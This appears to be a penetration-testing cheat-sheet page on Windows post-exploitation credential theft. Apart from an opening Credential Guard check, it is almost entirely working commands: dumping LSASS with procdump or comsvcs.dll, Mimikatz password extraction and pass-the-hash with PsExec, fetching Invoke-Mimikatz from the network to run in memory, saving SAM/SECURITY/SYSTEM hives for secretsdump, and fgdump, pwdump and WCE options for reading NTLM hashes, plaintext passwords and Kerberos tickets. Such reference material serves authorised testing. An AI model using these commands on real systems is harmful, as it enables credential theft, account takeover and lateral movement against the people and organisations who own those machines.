---
layout: default
title: Windows Post-Admin
parent: Post-Admin/Root
---

# Windows Post-Admin
{: .no_toc }

## Table of contents
{: .no_toc .text-delta }

1. TOC
{:toc}

---

## Manual Checks
### Is Credential Guard Enabled?
Windows Defender Credential Guard prohibits dumping of LSASS
```powershell
Get-CimInstance -ClassName Win32_DeviceGuard -Namespace root\Microsoft\Windows\DeviceGuard
```
- Check `SecurityServicesConfigured` and `SecurityServicesRunning` are set to `1` or `2`
    - `1` = CredentialGuard
    - `2` = Hypervisor enforced Code Integrity

## Mimikatz
### Offline
Dump LSASS
```powershell
procdump.exe -ma lsass.exe <output path>  # use -r flag to avoid reading lsass by dumping a clone
.\rundll32.exe C:\Windows\System32\comsvcs.dll, MiniDump 624 <output path> full  # uses native comsvcs.dll
```
- Alternatively can use task manager (Processes > lsass.exe > Create Dump File)

Extract Passwords
```shell
sekurlsa::minidump <dump path>
sekurlsa::logonpasswords
```

### On Target Machine
Extracting Passwords
```shell
privilege:debug
sekurlsa::logonPasswords
```

Pass-the-Hash
```powershell
sekurlsa::pth /user:<user> /domain:<domain> /ntlm:<ntlm hash>  # Hash from previous password extraction
PsExec.exe \\<domain> cmd.exe  # Spawn cmd prompt on given domain
```

### On Target Machine (PowerShell Version) 
Get script onto target machine ([Invoke-Mimikatz.ps1](https://github.com/clymb3r/PowerShell/blob/master/Invoke-Mimikatz/Invoke-Mimikatz.ps1))
```powershell
Invoke-WebRequest -UseBasicParsing <url> -Verbose                               # In-memory
Invoke-WebRequest -UseBasicParsing <url> -OutFile Invoke-Mimikatz.ps1 -Verbose  # Save to disk
```

Extact passwords, etc.
```powershell
Get-Help Invoke-Mimikatz
.\Invoke-Mimikatz -DumpCreds
Invoke-Mimikatz -ComputerName
```

---

## Registry Dump
Dump SAM, SECURITY and SYSTEM registry hives
```powershell
reg.exe save hklm\sam <output path>
reg.exe save hklm\security <output path>
reg.exe save hklm\system <output path>
```

Dump hashes on local machine
```shell
secretsdump.py -sam <sam> -security <security> -system <system> LOCAL  # Impacket
samdump2 <system> <sam>
```

## FGDump/PWDump
Dump hashes from `lsass` on the target machine
```shell
fgdump.exe
python pydump.py
pwdump7.exe
```

## Windows Credential Editor (WCE)
```shell
wce{32|64}.exe -l             # List current sessions & NTLM creds (default)
wce{32|64}.exe -r             # List current sessions & NTLM creds indefinitely
wce{32|64}.exe -e             # List current sessions & NTLM creds every time a logon event occurs
wce{32|64}.exe -s <NTLM>      # Change NTLM creds of current session
wce{32|64}.exe -c <NTLM>      # Run in new session with specified NTLM creds
wce{32|64}.exe -i <LUID>      # Specify LUID to use for current session
wce{32|64}.exe -d             # Delete NTLM creds from current session
wce{32|64}.exe -a <addresses> # Use addresses to read sessions and NTLM creds from memory (from GETLSASRVADDR.EXE)
wce{32|64}.exe -f             # Force 'safe mode'
wce{32|64}.exe -g             # Generate LM & NT hash
wce{32|64}.exe -K             # Dump Kerberos tickets to file
wce{32|64}.exe -k             # Read Kerberos tickets from file and insert into Windows cache
wce{32|64}.exe -w             # Dumps plaintext passwords
```
- `-o <file>` outputs to file
- <https://github.com/returnvar/wce>